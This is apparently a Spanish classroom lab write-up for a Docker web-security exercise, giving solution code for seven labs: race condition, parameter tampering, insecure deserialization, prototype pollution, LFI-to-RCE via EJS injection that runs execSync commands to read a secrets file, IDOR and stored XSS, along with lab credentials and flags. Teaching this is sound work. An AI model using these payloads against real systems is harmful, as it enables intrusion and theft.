# WRITEUP - Sesion 09

Este proyecto contiene un unico laboratorio Docker para la clase "Logica de negocio y otros tipos de ataques".

Ejecucion:

```bash
docker compose up --build
```

URL base:

```text
http://localhost:3000
```

El estado se aisla por cookie de sesion. Si varios alumnos usan el mismo contenedor, cada navegador mantiene su carrito, progreso, productos agregados y flags de forma separada.

## Rutas

- Profesor: `/A/lab1-race-condition/` hasta `/A/lab6-logica-negocio-3-vulnerabilidades/`
- Alumno: `/B/lab1-race-condition/` hasta `/B/lab6-logica-negocio-3-vulnerabilidades/`
- Final: `/lab7-final-sesion/`

## Lab 1 - Race Condition

Rutas:

- `/A/lab1-race-condition/`
- `/B/lab1-race-condition/`

Objetivo: comprar un producto de US$ 40 con saldo inicial de US$ 10. El cupon `FIFA2026ABC` solo deberia aplicarse una vez, pero la validacion y el incremento del contador no son atomicos.

Solucion desde la consola del navegador:

```javascript
await fetch('/api/A/lab1/cart', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({id: 1})
});

await Promise.all(Array.from({length: 5}, () =>
  fetch('/api/A/lab1/coupon', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({coupon: 'FIFA2026ABC'})
  })
));

await fetch('/api/A/lab1/checkout', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: '{}'
}).then(r => r.json());
```

Para alumno cambiar `/api/A/` por `/api/B/`.

Flags:

- `FLAG{lab1_race_condition_cupon_profesor}`
- `FLAG{lab1_race_condition_cupon_alumno}`

## Lab 2 - Logica de Negocio: Email y SMS

Rutas:

- Profesor: `/A/lab2-logica-negocio-email/`
- Alumno: `/B/lab2-logica-negocio-sms/`

Objetivo: manipular el POST para agregar el parametro `mensaje` y cambiar el tipo de comunicacion enviada. La flag aparece al forzar una plantilla no expuesta por la UI y enviar varios mensajes.

Profesor:

```javascript
await fetch('/api/A/lab2/send', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    destino: 'victima@fifa2026.com',
    plantilla: 'factura',
    mensaje: 'promocion_masiva',
    cantidad: 6
  })
}).then(r => r.json());
```

Alumno:

```javascript
await fetch('/api/B/lab2/send', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    destino: '+51900111222',
    plantilla: 'soporte',
    mensaje: 'alerta_seguridad',
    cantidad: 6
  })
}).then(r => r.json());
```

Flags:

- `FLAG{lab2_logica_negocio_email_profesor}`
- `FLAG{lab2_logica_negocio_sms_alumno}`

## Lab 3 - Deserializacion Insegura

Rutas:

- `/A/lab3-deserializacion-insegura/`
- `/B/lab3-deserializacion-insegura/`

Objetivo: el servidor confia en un paquete serializado en Base64 y restaura campos privilegiados controlados por el cliente.

Payload:

```javascript
const blob = btoa(JSON.stringify({
  user: 'cliente',
  role: 'admin',
  credits: 10000,
  workflow: 'release_flag'
}));

await fetch('/api/A/lab3/import', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({blob})
}).then(r => r.json());
```

Para alumno cambiar `/api/A/` por `/api/B/`.

Flags:

- `FLAG{lab3_deserializacion_insegura_profesor}`
- `FLAG{lab3_deserializacion_insegura_alumno}`

## Lab 4 - Prototype Pollution

Rutas:

- `/A/lab4-prototype-pollution/`
- `/B/lab4-prototype-pollution/`

Objetivo: el merge recursivo de preferencias permite escribir sobre `Object.prototype`.

Profesor:

```javascript
await fetch('/api/A/lab4/preferences', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: '{"__proto__":{"isAdmin":true}}'
}).then(r => r.json());
```

Alumno:

```javascript
await fetch('/api/B/lab4/preferences', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: '{"__proto__":{"canApproveRefunds":true}}'
}).then(r => r.json());
```

Flags:

- `FLAG{lab4_prototype_pollution_profesor}`
- `FLAG{lab4_prototype_pollution_alumno}`

## Lab 5 - Encadenamiento LFI to RCE

Rutas:

- `/A/lab5-lfi-to-rce/`
- `/B/lab5-lfi-to-rce/`

Objetivo: inyectar contenido controlado en el log mediante el encabezado `User-Agent` y luego cargar ese log desde el visor documental usando LFI. El visor procesa el log como una plantilla EJS del servidor; el impacto real es ejecucion de codigo del lado servidor, por ejemplo ejecutar `id` o invocar `child_process` para leer un archivo sensible.

Profesor:

Prueba de ejecucion de comandos:

```bash
curl -i -X POST http://localhost:3000/api/A/lab5/ping \
  -H 'Content-Type: application/json' \
  -H 'User-Agent: <%= require("child_process").execSync("id").toString() %>' \
  --data '{}'
```

```bash
curl 'http://localhost:3000/api/A/lab5/file?name=logs/access.log'
```

Lectura del archivo sensible:

```bash
curl -i -X POST http://localhost:3000/api/A/lab5/ping \
  -H 'Content-Type: application/json' \
  -H 'User-Agent: <%= require("child_process").execSync("cat /app/secrets/lab5-profesor.txt").toString() %>' \
  --data '{}'
```

```bash
curl 'http://localhost:3000/api/A/lab5/file?name=logs/access.log'
```

Alumno:

Prueba de ejecucion de comandos:

```bash
curl -i -X POST http://localhost:3000/api/B/lab5/ping \
  -H 'Content-Type: application/json' \
  -H 'User-Agent: <%= require("child_process").execSync("id").toString() %>' \
  --data '{}'
```

```bash
curl 'http://localhost:3000/api/B/lab5/file?name=logs/access.log'
```

Lectura del archivo sensible:

```bash
curl -i -X POST http://localhost:3000/api/B/lab5/ping \
  -H 'Content-Type: application/json' \
  -H 'User-Agent: <%= require("child_process").execSync("cat /app/secrets/lab5-alumno.txt").toString() %>' \
  --data '{}'
```

```bash
curl 'http://localhost:3000/api/B/lab5/file?name=logs/access.log'
```

Flags:

- `FLAG{lab5_lfi_to_rce_profesor}`
- `FLAG{lab5_lfi_to_rce_alumno}`

## Lab 6 - Logica de Negocio con 3 Vulnerabilidades

Rutas:

- Profesor: `/A/lab6-logica-negocio-3-vulnerabilidades/`
- Alumno: `/B/lab6-logica-negocio-3-vulnerabilidades/`

Vulnerabilidades requeridas:

1. Reutilizacion del mismo cupon varias veces.
2. IDOR en vouchers.
3. XSS en foto de perfil.

Profesor: las credenciales estan visibles en el rectangulo de la pagina.

Alumno: las credenciales estan en el JavaScript de la aplicacion:

```text
cronaldo@fifa2026.com:Portugal2026@
```

Explotacion profesor:

```javascript
await fetch('/api/A/lab6/coupon', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({coupon: 'FIFA2026ABC'})
});

await fetch('/api/A/lab6/coupon', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({coupon: 'FIFA2026ABC'})
});

await fetch('/api/A/lab6/vouchers/7002').then(r => r.json());

await fetch('/api/A/lab6/profile', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({photo: '<img src=x onerror=alert(1)>'})
}).then(r => r.json());
```

Para alumno cambiar `/api/A/` por `/api/B/`.

Flags:

- `FLAG{lab6_logica_negocio_tres_vulnerabilidades_profesor}`
- `FLAG{lab6_logica_negocio_tres_vulnerabilidades_alumno}`

## Lab 7 - Laboratorio Final

Ruta:

- `/lab7-final-sesion/`

Credenciales filtradas en JavaScript:

```text
operario@fifa2026.com : EnterpriseFIFA2026!
```

Flujo:

1. Iniciar sesion como `operario@fifa2026.com`.
2. Abrir proyectos. La UI lista proyectos de sede `2000-2015`.
3. Consultar por IDOR un proyecto de la segunda sede, por ejemplo:

```javascript
await fetch('/api/final/projects/1000').then(r => r.json());
```

4. Revisar la ruta filtrada en JavaScript:

```text
/api/final/administradores/listar-usuarios
```

5. Listar usuarios:

```javascript
await fetch('/api/final/administradores/listar-usuarios').then(r => r.json());
```

6. Iniciar sesion como `tecnico@fifa2026.com` con la misma contrasena:

```text
EnterpriseFIFA2026!
```

7. Agregar un producto con payload XSS almacenado:

```javascript
await fetch('/api/final/products', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    name: 'Producto prueba',
    description: '<img src=x onerror=alert(1)>'
  })
}).then(r => r.json());
```

Flag:

- `FLAG{lab7_encadenamiento_final_sesion}`

El boton "Resetear laboratorio" borra solo los productos maliciosos agregados en la sesion actual.
